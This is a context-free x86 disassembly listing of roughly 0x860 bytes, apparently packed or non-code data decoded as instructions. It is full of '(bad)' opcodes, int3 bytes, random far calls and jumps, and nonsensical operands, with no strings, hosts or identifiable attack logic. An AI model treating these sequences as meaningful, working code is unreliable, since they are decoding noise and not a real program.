  414939:	jmp    FWORD PTR [edi+0x0]
  41493c:	mov    ch,0xff
  41493e:	(bad)  
  414941:	call   FWORD PTR [edi-0x34]
  414944:	pop    es
  414945:	jmp    edx
  414947:	int3   
  414948:	icebp  
  414949:	dec    ebx
  41494b:	add    BYTE PTR [ebx+eax*4-0x7c4d0053],al
  414952:	jl     0x414953
  414954:	jbe    0x414955
  414956:	xchg   esp,eax
  414957:	add    BYTE PTR [edx],cl
  414959:	call   DWORD PTR [ecx]
  41495b:	jmp    esp
  41495d:	int3   
  41495e:	fadd   QWORD PTR [eax]
  414960:	fisttp WORD PTR [ecx-0x336a00e3]
  414966:	hlt    
  414967:	add    BYTE PTR [eax-0x33001a34],ah
  41496d:	add    BYTE PTR [eax-0x1],bl
  414970:	push   cs
  414971:	jmp    FWORD PTR [edi]
  414973:	or     DWORD PTR ds:0xc2893000,0x0
  41497a:	pushf  
  41497b:	sbb    eax,0x0
  41497e:	dec    ecx
  41497f:	add    BYTE PTR [esi+0x0],cl
  414982:	jle    0x414984
  414984:	lock (bad) 
  414986:	clc    
  414987:	jmp    FWORD PTR [eax-0x34]
  41498a:	rol    BYTE PTR [ebx+0x48cc89],1
  414990:	add    eax,0x7005cff
  414995:	add    BYTE PTR ds:0xc000a0ff,cl
  41499b:	int3   
  41499c:	fdiv   st(7),st
  41499e:	mov    WORD PTR [eax],es
  4149a0:	(bad)  
  4149a3:	jmp    FWORD PTR [edi-0x1]
  4149a6:	inc    DWORD PTR [eax]
  4149a8:	or     BYTE PTR [ebx+0x9e00e2],al
  4149ae:	mov    dh,0x83
  4149b0:	jns    0x4149b1
  4149b2:	mov    esp,ecx
  4149b4:	dec    eax
  4149b5:	call   FWORD PTR [edi-0x34]
  4149b8:	retf   0xa583
  4149bb:	add    BYTE PTR ds:0x32ff32ff,ah
  4149c1:	sbb    DWORD PTR [edi+edi*8],0xb
  4149c5:	call   DWORD PTR [edx]
  4149c7:	cmp    esp,0xffffff83
  4149ca:	mov    eax,0x8acc60ff
  4149cf:	push   DWORD PTR [ebx]
  4149d1:	call   DWORD PTR [edi-0x77]
  4149d4:	xchg   edx,eax
  4149d5:	int3   
  4149d6:	mov    DWORD PTR [bx+si-0x2600],ebx
  4149db:	push   DWORD PTR [ecx]
  4149dd:	add    BYTE PTR [edx],al
  4149df:	add    BYTE PTR [ebp-0x7d],al
  4149e2:	dec    eax
  4149e3:	call   ecx
  4149e5:	mov    DWORD PTR [ebp-0x1],ebp
  4149e8:	js     0x4149e9
  4149ea:	mov    eax,0x550086ff
  4149ef:	push   DWORD PTR [eax+0x7900efff]
  4149f5:	inc    ebp
  4149f7:	adc    edx,0xffffffff
  4149fa:	cmc    
  4149fb:	add    BYTE PTR [eax],ah
  4149fd:	jmp    ecx
  4149ff:	add    BYTE PTR [edi+edi*8+0xd98917],bh
  414a06:	call   0x2100:0xd7ff8aff
  414a0d:	add    al,bh
  414a0f:	add    bh,dl
  414a11:	call   DWORD PTR [ebx-0x77]
  414a14:	icebp  
  414a15:	(bad)  
  414a16:	cmp    edi,edi
  414a18:	jnp    0x414a19
  414a1a:	dec    ebx
  414a1b:	(bad)  
  414a1c:	ds add ah,ah
  414a1f:	call   FWORD PTR [ebx-0x577c9e00]
  414a25:	(bad)  
  414a26:	mov    edx,0xa7831eff
  414a2b:	inc    DWORD PTR ds:0x1ff45ff
  414a31:	int3   
  414a32:	xchg   edx,eax
  414a33:	int3   
  414a34:	lods   eax,DWORD PTR ds:[esi]
  414a35:	inc    DWORD PTR [eax-0x1]
  414a38:	mov    bl,0xff
  414a3a:	(bad)  
  414a3b:	dec    DWORD PTR [edi]
  414a3d:	add    ch,dl
  414a3f:	int3   
  414a40:	mov    al,ds:0x2dff9300
  414a45:	sub    DWORD PTR [esi-0x1],0xfffffff1
  414a49:	add    BYTE PTR [edx],ch
  414a4b:	jmp    ebp
  414a4d:	int3   
  414a4e:	es (bad) 
  414a50:	aas    
  414a51:	add    DWORD PTR [edi],0xffffffff
  414a54:	xchg   ebx,eax
  414a55:	add    BYTE PTR [ecx+ecx*4-0x7c1600ab],bl
  414a5c:	clc    
  414a5d:	int3   
  414a5e:	fcos   
  414a60:	adc    eax,DWORD PTR [ebx-0x330f76ab]
  414a66:	inc    edi
  414a67:	call   FWORD PTR [edx-0x77]
  414a6a:	xchg   ecx,eax
  414a6b:	call   DWORD PTR [esi]
  414a6d:	mov    DWORD PTR [ebx+0x6bff3800],ecx
  414a73:	jmp    DWORD PTR [eax+eax*1+0x5d0001]
  414a7a:	xor    eax,DWORD PTR [eax]
  414a7c:	imul   ecx,esp,0xfffffffa
  414a7f:	cmp    ebx,0x0
  414a82:	test   BYTE PTR [ebx-0xdd33e1],0xff
  414a89:	cmp    esi,0xffffffcc
  414a8c:	and    al,0xff
  414a8e:	jne    0x414a8f
  414a90:	jae    0x414a92
  414a92:	ror    ah,0x89
  414a95:	jmp    DWORD PTR [edi]
  414a97:	call   FWORD PTR [edi+edi*8]
  414a9a:	jmp    0x5740f66b
  414a9f:	mov    ebp,eax
  414aa1:	or     edx,0xffffffff
  414aa4:	fdivr  st,st(7)
  414aa6:	fwait
  414aa7:	int3   
  414aa8:	push   esp
  414aa9:	push   DWORD PTR [esi+0x32ffb4ff]
  414aaf:	add    BYTE PTR [eax],bh
  414ab1:	add    al,bh
  414ab3:	(bad)  
  414ab4:	inc    DWORD PTR [eax]
  414ab6:	aas    
  414ab7:	(bad)  
  414ab8:	jg     0x414aba
  414aba:	loop   0x414abb
  414abc:	inc    edx
  414abd:	add    BYTE PTR [edx+0x220072ff],dh
  414ac3:	add    BYTE PTR [ecx],bl
  414ac5:	int3   
  414ac6:	pop    edi
  414ac7:	(bad)  
  414ac8:	(bad)  
  414aca:	sbb    al,0x0
  414acc:	cmp    edi,0x46
  414acf:	push   ecx
  414ad1:	mov    DWORD PTR [ebx],ebx
  414ad3:	int3   
  414ad4:	or     DWORD PTR [ecx-0xa233dc],0xd4ff85
  414ade:	inc    edi
  414adf:	call   eax
  414ae1:	int3   
  414ae2:	popa   
  414ae3:	call   FWORD PTR [edi]
  414ae5:	add    BYTE PTR [ecx+0x0],bl
  414ae8:	mov    ebp,0xd789acff
  414aed:	and    edx,0xffffffcc
  414af0:	test   edi,edi
  414af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414af3:	sub    ebx,0xffffffff
  414af6:	xor    DWORD PTR [ebx-0x33b6ff2c],eax
  414afc:	xchg   esp,eax
  414afd:	(bad)  
  414afe:	fild   WORD PTR [ebx-0x870047]
  414b04:	iret   
  414b05:	jmp    FWORD PTR [edx+0x0]
  414b08:	popf   
  414b09:	add    BYTE PTR [ecx+0x17001e00],dl
  414b0f:	int3   
  414b10:	lods   eax,DWORD PTR ds:[esi]
  414b11:	add    BYTE PTR [ebx],ch
  414b13:	call   FWORD PTR [edx-0x1]
  414b16:	enter  0xe8ff,0xff
  414b1a:	cmc    
  414b1b:	inc    DWORD PTR [esi]
  414b1d:	(bad)  
  414b1e:	fadd   QWORD PTR [ebx+0x7cff8d]
  414b24:	pusha  
  414b25:	or     DWORD PTR [ebp-0x34],0x64
  414b29:	inc    DWORD PTR [ebp+0x4fffab00]
  414b2f:	jmp    FWORD PTR [eax+eax*1]
  414b32:	hlt    
  414b33:	mov    DWORD PTR ds:0xfc00b5ff,esi
  414b39:	sbb    DWORD PTR [edx+0x45ff7ccc],0xffffffff
  414b40:	repz jmp DWORD PTR [edx]
  414b43:	(bad)  
  414b44:	add    BYTE PTR ds:[ecx-0x7d],dh
  414b48:	mov    ecx,esp
  414b4a:	jbe    0x414b18
  414b4c:	jle    0x414b4e
  414b4e:	xor    DWORD PTR [eax],eax
  414b50:	(bad)  
  414b52:	xchg   ecx,eax
  414b53:	jmp    DWORD PTR [edi+edi*8-0x68]
  414b57:	add    BYTE PTR [ecx-0x1800e701],dh
  414b5d:	add    BYTE PTR [eax+0x5f003a00],dl
  414b63:	add    al,al
  414b65:	add    BYTE PTR ds:0x3400e783,ah
  414b6b:	push   ecx
  414b6d:	jmp    FWORD PTR [ebx+eax*4+0x1]
  414b71:	jmp    DWORD PTR [ebp+0x0]
  414b74:	mov    DWORD PTR [eax],eax
  414b76:	sub    bh,bh
  414b78:	mov    ebp,0x12004c83
  414b7d:	add    BYTE PTR [edi-0x7d],bl
  414b80:	xchg   BYTE PTR [eax],al
  414b82:	inc    esi
  414b83:	xor    DWORD PTR [esp+ecx*8-0x28],0xffffffff
  414b88:	and    edi,edi
  414b8a:	push   ebp
  414b8b:	add    BYTE PTR [esi-0x1],cl
  414b8e:	dec    ebx
  414b8f:	push   DWORD PTR [eax]
  414b91:	(bad)  
  414b92:	(bad)  
  414b93:	push   DWORD PTR [edi+edi*8+0x37005b]
  414b9a:	pop    es
  414b9b:	push   DWORD PTR [esi]
  414b9d:	add    BYTE PTR [edi-0x53337101],dh
  414ba3:	jmp    DWORD PTR [edx]
  414ba5:	add    BYTE PTR [ebp-0x7d],cl
  414ba8:	stos   BYTE PTR es:[edi],al
  414ba9:	inc    DWORD PTR [eax-0x1f00f577]
  414baf:	jmp    DWORD PTR [esi]
  414bb1:	add    esp,0xffffffcc
  414bb4:	(bad)  
  414bb5:	jmp    FWORD PTR [ebx-0x1]
  414bb8:	imul   edi,edi,0xff9dff42
  414bbe:	int3   
  414bbf:	call   FWORD PTR [esi+0x0]
  414bc2:	mov    ecx,esp
  414bc4:	or     edi,edi
  414bc6:	popf   
  414bc7:	sub    DWORD PTR [ebx],0xffffffcc
  414bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bcb:	or     DWORD PTR [ecx],0xffffff83
  414bce:	mov    edi,edi
  414bd0:	hlt    
  414bd1:	mov    DWORD PTR [edx+0x983eccc],eax
  414bd7:	dec    DWORD PTR [ecx-0x44ff9c00]
  414bdd:	push   DWORD PTR [edi-0x1]
  414be0:	(bad)  
  414be2:	les    eax,FWORD PTR [ebx-0x267cf3]
  414be8:	and    DWORD PTR cs:[ebx+0x889d400],0xffffffff
  414bf0:	push   eax
  414bf1:	add    BYTE PTR [edi-0x7d],ah
  414bf4:	sar    bh,0x82
  414bf7:	add    BYTE PTR [esi],cl
  414bf9:	cmp    ebx,0xffffffff
  414bfc:	mov    edx,0x538323ff
  414c01:	int3   
  414c02:	fadd   DWORD PTR [eax]
  414c04:	clc    
  414c05:	add    bl,bh
  414c07:	dec    DWORD PTR [edx-0x34]
  414c0a:	mov    esp,0xe2ffff00
  414c0f:	add    DWORD PTR [eax],0xffffffff
  414c12:	mov    ecx,0xcf0091cc
  414c17:	int3   
  414c18:	out    dx,al
  414c19:	add    cl,ch
  414c1b:	add    BYTE PTR [eax+0x0],cl
  414c1e:	out    dx,eax
  414c1f:	(bad)  
  414c20:	inc    BYTE PTR [eax]
  414c22:	(bad)  
  414c24:	cmp    edi,edi
  414c26:	jnp    0x414c28
  414c28:	dec    ebx
  414c29:	and    DWORD PTR [eax-0x38ffea01],0xffffff83
  414c30:	mov    edi,edi
  414c32:	verr   bp
  414c35:	mov    DWORD PTR ds:0xa100d0ff,esi
  414c3b:	(bad)  
  414c3c:	jge    0x414c3d
  414c3e:	mov    edx,0xdeffa100
  414c43:	jmp    FWORD PTR [edi-0x1]
  414c46:	jb     0x414bd1
  414c48:	arpl   di,di
  414c4a:	inc    esi
  414c4b:	xor    DWORD PTR [ebx-0x1f330877],0xffffff83
  414c52:	retf   
  414c53:	inc    DWORD PTR [edx+0x24ffa700]
  414c59:	add    BYTE PTR [eax],bl
  414c5b:	jmp    DWORD PTR [ebp-0x3f333a7d]
  414c61:	(bad)  
  414c62:	mov    edi,0x93ff6e83
  414c67:	inc    DWORD PTR [eax-0x1]
  414c6a:	push   0x0
  414c6c:	pusha  
  414c6d:	sbb    DWORD PTR [eax+0x0],0xffffff8e
  414c71:	add    cl,ah
  414c73:	cmp    DWORD PTR [ecx+0x2eff1089],0xffffffff
  414c7a:	jmp    0x414c7c
  414c7c:	out    0xff,al
  414c7e:	add    BYTE PTR [ebx+0xba0007],0x7a
  414c85:	add    bl,ah
  414c87:	add    BYTE PTR ds:0x1800e4ff,bl
  414c8d:	cmp    DWORD PTR [esi-0x1],0xffffffb5
  414c91:	add    BYTE PTR ds:0xfcffe400,bl
  414c97:	(bad)  
  414c98:	in     al,dx
  414c99:	add    BYTE PTR [ecx-0x77],dh
  414c9c:	sti    
  414c9d:	int3   
  414c9e:	mov    ds:0x41ff28cc,al
  414ca3:	adc    DWORD PTR [eax-0x43009001],0xffffffcc
  414caa:	jmp    DWORD PTR gs:[edx-0x5200b000]
  414cb1:	call   edx
  414cb3:	add    BYTE PTR [edi+edi*8-0x6400f0],dl
  414cba:	scas   eax,DWORD PTR es:[edi]
  414cbb:	dec    eax
  414cbd:	dec    DWORD PTR [ecx-0x6b001d01]
  414cc3:	inc    ecx
  414cc5:	sbb    esi,0xffffffff
  414cc8:	lock add ch,al
  414ccb:	sub    DWORD PTR [ebx-0x3f76dd01],0x0
  414cd2:	arpl   sp,cx
  414cd4:	dec    esp
  414cd5:	add    bh,ah
  414cd7:	call   DWORD PTR [ebx-0x1]
  414cda:	in     eax,0xff
  414cdc:	cmp    bh,0xb1
  414cdf:	(bad)  
  414ce0:	call   0x6141a6e4
  414ce5:	inc    DWORD PTR [eax+eax*1-0x18]
  414ce9:	add    BYTE PTR [esi-0x17ffe477],bl
  414cef:	add    BYTE PTR [edi+0x0],ch
  414cf2:	rol    DWORD PTR [eax],1
  414cf4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cf5:	push   DWORD PTR [esi-0x7d00f601]
  414cfb:	add    cl,ch
  414cfd:	jmp    esp
  414cff:	jmp    DWORD PTR [eax]
  414d01:	call   FWORD PTR [edi+0x5b00cdff]
  414d07:	add    BYTE PTR [ecx-0x5233d000],cl
  414d0d:	dec    DWORD PTR [eax+eax*1-0x80]
  414d11:	(bad)  
  414d12:	mov    edi,0x8a89a500
  414d17:	mov    DWORD PTR [edx],ebp
  414d19:	add    BYTE PTR [ecx+0x4f009b00],cl
  414d1f:	add    BYTE PTR [edi+edi*8+0x18cc72],ah
  414d26:	ins    BYTE PTR es:[edi],dx
  414d27:	jmp    FWORD PTR [eax]
  414d29:	add    BYTE PTR [edx+0x0],bl
  414d2c:	fadd   QWORD PTR [eax]
  414d2e:	(bad)  
  414d2f:	dec    ebx
  414d31:	add    BYTE PTR [eax+eax*1-0x9000df],bh
  414d38:	jne    0x414d39
  414d3a:	sub    eax,DWORD PTR [eax]
  414d3c:	repz push esi
  414d3f:	int3   
  414d40:	scas   al,BYTE PTR es:[edi]
  414d41:	add    BYTE PTR [edi],dh
  414d43:	call   FWORD PTR [edi-0x7d]
  414d46:	sub    bh,bh
  414d48:	rol    DWORD PTR [ebx+0xd3ffe9],0x5b
  414d4f:	dec    DWORD PTR [esi]
  414d51:	(bad)  
  414d52:	jg     0x414d54
  414d54:	imul   eax,DWORD PTR [ebx-0x7c97002d],0xa1cce9
  414d5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d5f:	int3   
  414d60:	gs dec esp
  414d63:	adc    DWORD PTR [esi-0x33768c01],0xffffffff
  414d6a:	add    DWORD PTR [ebx-0x810057],0x68
  414d71:	add    BYTE PTR [edi],dl
  414d73:	jmp    DWORD PTR [ebx+0x0]
  414d76:	mov    ebx,0xbccfa00
  414d7b:	mov    edx,esp
  414d7d:	or     edx,0xffffffff
  414d80:	fiadd  DWORD PTR [eax]
  414d82:	sbb    cl,BYTE PTR [ecx-0x7c0a0024]
  414d88:	fld    QWORD PTR [eax]
  414d8a:	bound  eax,QWORD PTR [eax]
  414d8c:	mov    bh,bh
  414d8e:	mov    cl,0xff
  414d90:	scas   al,BYTE PTR es:[edi]
  414d91:	add    BYTE PTR [eax-0x9000201],cl
  414d97:	add    bh,dh
  414d99:	(bad)  
  414d9a:	fild   DWORD PTR [eax]
  414d9c:	retf   
  414d9d:	call   FWORD PTR [esi+0x40ff4400]
  414da3:	(bad)  
  414da4:	jnp    0x414da6
  414da6:	mov    dl,0xff
  414da8:	test   DWORD PTR [eax],eax
  414daa:	mov    ds:0xb7fff7ff,al
  414daf:	jmp    ecx
  414db1:	cmp    ebx,0xffffffcc
  414db4:	push   ecx
  414db5:	add    DWORD PTR [edi+edi*8],0x28
  414db9:	int3   
  414dba:	dec    ebx
  414dbb:	adc    DWORD PTR [esi-0x2d004e01],0xffffffff
  414dc2:	push   eax
  414dc3:	add    bh,al
  414dc5:	add    BYTE PTR [esp+ecx*8+0x53],dh
  414dc9:	dec    DWORD PTR [edx]
  414dcb:	add    BYTE PTR [edi+edi*8],ah
  414dce:	xchg   ebp,eax
  414dcf:	mov    DWORD PTR [edi+edi*8+0x958915],edi
  414dd6:	sar    bh,1
  414dd8:	retf   0xc000
  414ddb:	jmp    FWORD PTR [ebx]
  414ddd:	add    dh,cl
  414ddf:	int3   
  414de0:	fmul   QWORD PTR [ecx-0x3337ff67]
  414de6:	xlat   BYTE PTR ds:[ebx]
  414de7:	jmp    FWORD PTR [edi+0x2e831083]
  414ded:	add    DWORD PTR [eax],0xffffffff
  414df0:	bswap  esp
  414df2:	cmp    bh,bh
  414df4:	mov    esi,0xe8ff4d00
  414df9:	add    ah,bl
  414dfb:	cmp    DWORD PTR [edi+edi*8-0x4c00de],0x2a
  414e03:	jmp    DWORD PTR [esi-0x1]
  414e06:	mov    al,ds:0x40000000
  414e0b:	add    al,al
  414e0d:	int3   
  414e0e:	std    
  414e0f:	int3   
  414e10:	adc    esp,ecx
  414e12:	pop    edi
  414e13:	push   DWORD PTR ds:0xb7cc9bff
  414e19:	(bad)  
  414e1a:	cmp    edi,edi
  414e1c:	sahf   
  414e1d:	add    cl,ch
  414e1f:	dec    DWORD PTR [ecx-0x7d]
  414e22:	iret   
  414e23:	add    dh,dh
  414e25:	jmp    FWORD PTR [edx-0x34]
  414e28:	test   eax,0xd3007600
  414e2d:	mov    DWORD PTR [eax+0x51ff2ccc],esi
  414e33:	jmp    ebp
  414e35:	add    dh,cl
  414e37:	call   DWORD PTR [edx]
  414e39:	push   DWORD PTR [edx-0x3c009234]
  414e3f:	add    BYTE PTR [esi-0x77],bl
  414e42:	pop    eax
  414e43:	add    ch,al
  414e45:	add    BYTE PTR [edx+0x75ff0eff],bl
  414e4b:	add    BYTE PTR [esi],bl
  414e4d:	inc    DWORD PTR [eax+eax*1+0xafffa3]
  414e54:	push   edx
  414e55:	sbb    DWORD PTR [edx],0xffffffff
  414e58:	cmp    DWORD PTR [eax],eax
  414e5a:	inc    eax
  414e5b:	add    BYTE PTR ds:0xd1ff8883,bh
  414e61:	and    DWORD PTR [edx-0x1],0xffffff93
  414e65:	mov    ebx,edx
  414e67:	add    BYTE PTR [ecx+0x54ffcaff],bl
  414e6d:	mov    DWORD PTR [esi-0x18009800],edx
  414e73:	add    BYTE PTR [edx+0x2acc0fff],al
  414e79:	add    ah,cl
  414e7b:	jmp    ebp
  414e7d:	int3   
  414e7e:	add    BYTE PTR [eax],0x11
  414e81:	add    dh,ah
  414e83:	mov    esi,esp
  414e85:	dec    DWORD PTR [edi+0x19007200]
  414e8b:	add    BYTE PTR [eax-0x1],cl
  414e8e:	mov    eax,ds:0x51001d83
  414e93:	and    ebx,0x0
  414e96:	fadd   QWORD PTR [ebx-0x12000e]
  414e9c:	cmp    BYTE PTR [ebx-0x7c94ff2e],al
  414ea2:	jne    0x414ea4
  414ea4:	iret   
  414ea5:	call   DWORD PTR [esp+ecx*8+0xc2ffcf]
  414eac:	dec    ecx
  414ead:	cmp    esp,0xffffff89
  414eb0:	mov    edi,0x50ff7eff
  414eb5:	and    DWORD PTR [edi+edi*8],0x4b
  414eb9:	call   DWORD PTR [edx]
  414ebb:	sub    DWORD PTR [eax],0x0
  414ebe:	dec    esp
  414ebf:	add    dl,al
  414ec1:	call   DWORD PTR [ecx+0x6cccd200]
  414ec7:	add    BYTE PTR [edx-0xf005077],dh
  414ecd:	sub    DWORD PTR [esi],0xffffff83
  414ed0:	fild   DWORD PTR [ebx-0xd77c18]
  414ed6:	mov    ch,0x0
  414ed8:	mov    WORD PTR [eax],es
  414eda:	or     al,0xff
  414edc:	(bad)  
  414edd:	dec    DWORD PTR [edi+0x0]
  414ee0:	pushf  
  414ee1:	add    BYTE PTR [ebp-0x1],dh
  414ee4:	pusha  
  414ee5:	mov    DWORD PTR [edi-0x1],eax
  414ee8:	push   ds
  414ee9:	int3   
  414eea:	stos   BYTE PTR es:[edi],al
  414eeb:	cmp    DWORD PTR [eax+0x588386ff],0x0
  414ef2:	add    eax,0x8c83c9cc
  414ef7:	and    DWORD PTR [esi+0x789d489],0xffffffff
  414efe:	adc    eax,0xd8ff9683
  414f03:	add    BYTE PTR [ebx-0x6e339801],al
  414f09:	add    BYTE PTR [edi-0x77],bl
  414f0c:	js     0x414e91
  414f0e:	fadd   QWORD PTR [eax]
  414f10:	mov    dh,0xff
  414f12:	mov    ah,0xcc
  414f14:	sar    edi,0xca
  414f17:	add    BYTE PTR [edi],dl
  414f19:	mov    DWORD PTR [esi-0x1],ebp
  414f1c:	in     al,dx
  414f1d:	int3   
  414f1e:	xchg   ebp,eax
  414f1f:	dec    DWORD PTR [edi-0x63006c00]
  414f25:	add    BYTE PTR [ebp+0x0],dl
  414f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f29:	(bad)  
  414f2a:	(bad)  
  414f2c:	and    eax,0xb83e983
  414f31:	add    ah,ch
  414f33:	inc    DWORD PTR [eax]
  414f35:	dec    DWORD PTR [ebx-0x7d]
  414f38:	outs   dx,BYTE PTR ds:[esi]
  414f39:	add    ah,ah
  414f3b:	call   FWORD PTR [esi+0x66cc89ff]
  414f41:	call   DWORD PTR [esi-0x57003201]
  414f47:	sub    esp,0xffffffff
  414f4a:	mov    ds:0x16ff0800,al
  414f4f:	cmp    DWORD PTR [edi+edi*8-0xc63303],0xffffffa6
  414f57:	add    BYTE PTR [ecx+0x54006b00],bl
  414f5d:	(bad)  
  414f5e:	mov    esp,0x49ffe7ff
  414f63:	(bad)  
  414f64:	cmp    al,0x0
  414f66:	adc    DWORD PTR [ebx-0x7c0001],eax
  414f6c:	daa    
  414f6d:	(bad)  
  414f6e:	fild   WORD PTR [eax]
  414f70:	mov    al,ds:0x5effb400
  414f75:	or     DWORD PTR [esi-0x7d],0x62
  414f79:	inc    DWORD PTR ds:0x76006dff
  414f7f:	add    BYTE PTR [ebx+0x40ffd800],ah
  414f85:	or     DWORD PTR [eax+0x0],0x2c
  414f89:	inc    DWORD PTR [edi+edi*8]
  414f8c:	and    al,0xff
  414f8e:	adc    eax,0x18894acc
  414f93:	add    dh,dl
  414f95:	mov    DWORD PTR [esi],esi
  414f97:	int3   
  414f98:	sbb    al,0x0
  414f9a:	clc    
  414f9b:	mov    edx,esi
  414f9d:	add    BYTE PTR [edx],ch
  414f9f:	add    BYTE PTR [ecx],dh
  414fa1:	int3   
  414fa2:	test   eax,0xff8400
  414fa7:	jmp    ecx
  414fa9:	add    BYTE PTR [eax-0x60ffa97d],ah
  414faf:	add    BYTE PTR [edi+0x0],dl
  414fb2:	retf   0xa200
  414fb5:	and    ebp,0xffffff89
  414fb8:	and    cl,ah
  414fba:	mov    eax,ds:0x91ff2600
  414fbf:	int3   
  414fc0:	mov    edi,0x82004700
  414fc5:	inc    ecx
  414fc7:	jmp    FWORD PTR [ecx-0x77]
  414fca:	push   ss
  414fcb:	mov    DWORD PTR [ebx-0x1],ebp
  414fce:	mov    bl,0xcc
  414fd0:	aas    
  414fd1:	jmp    FWORD PTR [ecx-0x1]
  414fd4:	mov    ds:0x99ff1eff,al
  414fd9:	add    BYTE PTR ds:0x88890289,bh
  414fdf:	add    BYTE PTR [esi-0x76006f00],ah
  414fe5:	call   FWORD PTR [eax+eax*1]
  414fe8:	iret   
  414fe9:	push   DWORD PTR [edi-0x7d]
  414fec:	je     0x414fba
  414fee:	xor    al,0xff
  414ff0:	(bad)  
  414ff1:	cmp    DWORD PTR [ecx+0x67832a89],0xffffffff
  414ff8:	pop    esi
  414ff9:	add    BYTE PTR [edi+edi*8-0x7c5a006b],bh
  415000:	add    ecx,DWORD PTR [ecx-0x7c8affcc]
  415006:	xor    DWORD PTR gs:[edx-0x1],0xffffffe3
  41500b:	call   FWORD PTR [esi+0x758334ff]
  415011:	or     DWORD PTR [ebx],0xffffffff
  415014:	scas   al,BYTE PTR es:[edi]
  415015:	add    BYTE PTR [eax+eax*1+0x62],bh
  415019:	call   DWORD PTR [ecx+ecx*4]
  41501c:	add    BYTE PTR [ebx-0xb7cf6],al
  415022:	inc    edx
  415023:	add    bl,al
  415025:	or     ebp,0xffffff89
  415028:	xchg   DWORD PTR [eax],eax
  41502a:	mov    cl,0xcc
  41502c:	dec    esp
  41502d:	jmp    DWORD PTR [eax-0x1]
  415030:	clc    
  415031:	int3   
  415032:	and    eax,DWORD PTR [eax]
  415034:	push   0x0
  415036:	push   ebp
  415037:	add    BYTE PTR [ebx-0x1],cl
  41503a:	data16 int3 
  41503c:	jae    0x41503d
  41503e:	push   ecx
  41503f:	int3   
  415040:	add    ah,cl
  415042:	pop    ss
  415043:	dec    DWORD PTR [esi-0x46005a00]
  415049:	xor    DWORD PTR [edi-0x1],0xffffffee
  41504d:	add    BYTE PTR [esp+ecx*8-0x1],ch
  415051:	add    ah,ch
  415053:	sbb    edx,0x0
  415056:	or     eax,0x360085ff
  41505b:	call   FWORD PTR [edi-0x1]
  41505e:	adc    edi,edi
  415060:	cwde   
  415061:	add    DWORD PTR [eax+0x0],0x4e
  415065:	jmp    DWORD PTR [esi-0x7d]
  415068:	adc    edi,edi
  41506a:	inc    eax
  41506b:	add    cl,al
  41506d:	add    BYTE PTR [eax+eax*1+0x7d],dl
  415071:	(bad)  
  415072:	fcos   
  415074:	jecxz  0x414ff9
  415076:	ret    
  415077:	mov    DWORD PTR [ebx-0x1],esi
  41507a:	sbb    al,0xcc
  41507c:	or     ah,cl
  41507e:	std    
  41507f:	adc    DWORD PTR [eax+eax*1],0xffffff83
  415083:	add    BYTE PTR [ecx],cl
  415085:	call   DWORD PTR ds:0xc4cc63cc
  41508b:	and    DWORD PTR [edx-0x1],0x7
  41508f:	add    BYTE PTR [ebx-0x33765c00],dh
  415095:	add    BYTE PTR [edi],ah
  415097:	jmp    FWORD PTR [ecx+0x0]
  41509a:	xlat   BYTE PTR ds:[ebx]
  41509b:	push   DWORD PTR [ecx]
  41509d:	call   DWORD PTR [edi]
  41509f:	jmp    ebp
  4150a1:	sub    DWORD PTR [eax],0xffffffff
  4150a4:	or     al,BYTE PTR [eax]
  4150a6:	push   ss
  4150a7:	int3   
  4150a8:	inc    ecx
  4150a9:	add    BYTE PTR [ecx-0x21ffac01],dh
  4150af:	add    BYTE PTR [esi],dh
  4150b1:	dec    DWORD PTR [eax-0x1]
  4150b4:	call   0xb8ff:0xd0898483
  4150bb:	add    BYTE PTR [ebx+0x37838300],ah
  4150c1:	int3   
  4150c2:	xchg   ecx,eax
  4150c3:	int3   
  4150c4:	retf   0xc000
  4150c7:	call   DWORD PTR [edi+edi*8-0x766c76ac]
  4150ce:	push   edx
  4150cf:	call   DWORD PTR [ebx-0x7d339f00]
  4150d5:	inc    DWORD PTR [ecx-0x2aff8377]
  4150db:	add    BYTE PTR [esi-0x377cb901],cl
  4150e1:	jmp    FWORD PTR [ebp-0x1]
  4150e4:	sbb    eax,0xf2cc50ff
  4150e9:	add    al,bh
  4150eb:	call   FWORD PTR [ecx]
  4150ed:	dec    DWORD PTR [edi-0x1]
  4150f0:	int    0xff
  4150f2:	adc    bh,bh
  4150f4:	inc    ecx
  4150f5:	mov    DWORD PTR [edi-0x7f007801],eax
  4150fb:	inc    ebp
  4150fd:	(bad)  
  4150fe:	jns    0x415083
  415100:	and    edi,edi
  415102:	clc    
  415103:	or     DWORD PTR [ecx+ecx*4-0x800eb],0xffffffa4
  41510b:	sbb    DWORD PTR [edx+0x0],0x27
  41510f:	dec    ecx
  415111:	adc    DWORD PTR [ebp+0xeff5b83],0xffffffff
  415118:	iret   
  415119:	add    BYTE PTR [edi+edi*8],ch
  41511c:	outs   dx,DWORD PTR ds:[esi]
  41511d:	call   FWORD PTR [esi-0x3003f00]
  415123:	(bad)  
  415124:	cmp    eax,DWORD PTR [ebx+0xdb834b]
  41512a:	das    
  41512b:	mov    DWORD PTR [edi+0xa00f3cc],edi
  415131:	add    ah,bh
  415133:	jmp    FWORD PTR [edi+0x76ffc900]
  415139:	jmp    DWORD PTR [eax-0x1]
  41513c:	(bad)  
  41513d:	inc    DWORD PTR [edi-0x1]
  415140:	pop    edi
  415141:	int3   
  415142:	je     0x4150c7
  415144:	jne    0x415145
  415146:	mov    edi,0xe300c183
  41514b:	mov    DWORD PTR ds:0xd5ff5783,edi
  415151:	add    BYTE PTR [edi+0x490059ff],ch
  415157:	inc    esp
  415159:	push   DWORD PTR [ecx-0x1]
  41515c:	in     al,0x0
  41515e:	xchg   esp,eax
  41515f:	int3   
  415160:	add    al,0x83
  415162:	test   DWORD PTR [eax],0xd583f0
  415168:	pop    esp
  415169:	add    BYTE PTR [edx+0x0],bh
  41516c:	mov    eax,ds:0x74896383
  415171:	int3   
  415172:	mov    esp,0xf10009ff
  415177:	jmp    DWORD PTR [eax-0x34]
  41517a:	jno    0x415105
  41517c:	or     al,0xff
  41517e:	pop    eax
  41517f:	or     DWORD PTR ds:0x18ff1500,0xffffffff
  415186:	out    0xff,eax
  415188:	fadd   DWORD PTR [eax]
  41518a:	call   0xb6ff:0x90051cc
  415191:	add    BYTE PTR [ebp-0x32fff977],dh
  415197:	add    BYTE PTR [edx],ch
